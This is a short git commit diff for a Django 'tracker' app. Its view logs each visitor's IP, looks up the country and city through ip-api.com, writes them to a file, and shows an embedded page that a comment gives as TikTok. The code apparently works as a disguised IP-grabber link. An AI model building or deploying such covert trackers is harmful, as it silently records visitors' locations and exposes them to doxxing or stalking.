22de3e15b2e9e546392ed5f79d65eeb5c8dc260e
123tien-alt <bulubuloa12321@gmail.com>
2025-06-03 23:31:26 +0700

    Thêm in IP người truy cập

--- tracker/views.py
+++ tracker/views.py
@@ -1,23 +1,7 @@
 from django.shortcuts import render
-
-# Create your views here.
-from django.shortcuts import render
-from django.http import HttpRequest
-import datetime
-
-
-
-def log_ip(request):
-    ip = get_client_ip(request)
-    with open("log_ip.txt", "a") as f:
-        f.write(f"{datetime.datetime.now()} - IP: {ip}\n")
-    return render(request, 'tracker/index.html')
 from django.http import HttpResponse
-
-def home(request):
-    ip = get_client_ip(request)
-    print(f"📡 IP truy cập: {ip}")
-    return HttpResponse(f"Chào bạn! IP của bạn là: {ip}")
+import datetime
+import requests
 
 def get_client_ip(request):
     # Lấy IP gốc kể cả khi có proxy
@@ -27,3 +11,28 @@ def get_client_ip(request):
     else:
         ip = request.META.get('REMOTE_ADDR')
     return ip
+
+def log_ip(request):
+    ip = get_client_ip(request)
+    location_info = "Không xác định"
+
+    try:
+        # Gọi API lấy thông tin IP
+        response = requests.get(f"http://ip-api.com/json/{ip}?fields=query,country,regionName,city")
+        data = response.json()
+        if data["country"]:
+            location_info = f"{data['query']} - {data['country']} ({data['city']})"
+    except Exception as e:
+        location_info = f"{ip} - lỗi khi lấy địa chỉ: {e}"
+
+    # Ghi log chi tiết
+    log_line = f"{datetime.datetime.now()} - {location_info}\n"
+    with open("log_ip.txt", "a") as f:
+        f.write(log_line)
+
+    # Vẫn load trang iframe như cũ (ví dụ TikTok)
+    return render(request, 'tracker/index.html')
+
+def home(request):
+    ip = get_client_ip(request)
+    return HttpResponse(f"Chào bạn! IP của bạn là: {ip}")
